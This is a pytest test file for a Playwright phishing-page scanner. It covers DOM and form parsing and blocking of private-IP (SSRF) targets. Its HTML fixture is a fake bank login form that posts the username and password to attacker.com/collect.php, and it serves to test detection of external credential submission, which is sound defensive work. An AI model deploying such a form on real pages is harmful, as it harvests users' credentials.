"""Unit and Integration tests for PlaywrightScanner and DOM evidence parsing."""

import asyncio
from pathlib import Path
import pytest
from app.scanner.models import ScanOptions, ScanResult, ScanStatus
from app.scanner.playwright_scanner import (
    PlaywrightScanner,
    parse_dom_evidence,
)


SAMPLE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Banking Login</title>
    <meta name="description" content="Official Portal">
    <meta property="og:title" content="Login Portal">
    <script src="https://cdn.example.org/tracker.js" async></script>
    <script>
        console.log("inline script");
    </script>
</head>
<body>
    <div class="login-container">
        <h1>Please Sign In</h1>
        <form id="authForm" action="https://attacker.com/collect.php" method="POST">
            <input type="text" name="username" id="user" placeholder="Username or Email" required>
            <input type="password" name="password" id="pass" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <form id="searchForm" action="/search" method="GET">
            <input type="text" name="q" placeholder="Search...">
        </form>
    </div>
</body>
</html>
"""


class TestDOMEvidenceParsing:
    """Test suite verifying DOM, form, input, and script extraction."""

    def test_dom_parsing_structure(self):
        title, forms, scripts, meta = parse_dom_evidence(
            html_content=SAMPLE_HTML,
            base_url="https://secure.bank.example.com/login"
        )

        # Title
        assert title == "Secure Banking Login"

        # Meta tags
        assert meta.get("description") == "Official Portal"
        assert meta.get("og:title") == "Login Portal"

        # Forms
        assert len(forms) == 2

        # Form 1: External submission phishing pattern
        f1 = forms[0]
        assert f1.form_id == "authForm"
        assert f1.action_url == "https://attacker.com/collect.php"
        assert f1.action_domain == "attacker.com"
        assert f1.method == "POST"
        assert f1.is_external_submission is True
        assert f1.has_password_field is True

        field_names = [f.name for f in f1.fields]
        assert "username" in field_names
        assert "password" in field_names

        pwd_field = next(f for f in f1.fields if f.name == "password")
        assert pwd_field.is_password is True
        assert pwd_field.is_required is True

        # Form 2: Internal relative search form
        f2 = forms[1]
        assert f2.form_id == "searchForm"
        assert f2.action_url == "https://secure.bank.example.com/search"
        assert f2.is_external_submission is False
        assert f2.has_password_field is False

        # Scripts
        assert len(scripts) == 2
        ext_script = next(s for s in scripts if s.is_external)
        assert ext_script.domain == "example.org"
        assert ext_script.async_attr is True

        inline_script = next(s for s in scripts if s.is_inline)
        assert inline_script.src == ""


class TestPlaywrightScannerExecution:
    """Test suite verifying scanner execution, Anti-SSRF interception, and live scanning."""

    def test_scanner_blocks_ssrf_without_browser(self, tmp_path):
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        result = scanner.scan_sync("http://192.168.1.1/admin")

        assert result.status == ScanStatus.BLOCKED_SSRF
        assert len(result.errors) > 0
        assert "Private/LAN IP address rejected" in result.errors[0]
        assert result.viewport_screenshot_path is None
        assert result.dom_snapshot_path is None

    def test_scanner_structured_pydantic_schema(self, tmp_path):
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        result = scanner.scan_sync("http://localhost:8000")

        # Verify full model dump and json serialization
        data = result.model_dump()
        assert "scan_id" in data
        assert "requested_url" in data
        assert "status" in data
        assert data["status"] == "BLOCKED_SSRF"

    @pytest.mark.asyncio
    async def test_live_controlled_scan(self, tmp_path):
        """Controlled live test against safe public domain."""
        scanner = PlaywrightScanner(screenshot_dir=tmp_path / "shots", dom_dir=tmp_path / "dom")
        opts = ScanOptions(
            timeout_seconds=15,
            capture_full_page=False,
            viewport_width=1280,
            viewport_height=720,
        )

        result = await scanner.scan("https://example.com", options=opts)

        assert result.status == ScanStatus.COMPLETED
        assert result.status_code == 200
        assert "example.com" in result.final_url
        assert result.page_title is not None
        assert "Example Domain" in result.page_title
        assert result.viewport_screenshot_path is not None
        assert Path(result.viewport_screenshot_path).exists()
        assert result.dom_snapshot_path is not None
        assert Path(result.dom_snapshot_path).exists()
        assert result.scan_duration_ms > 0
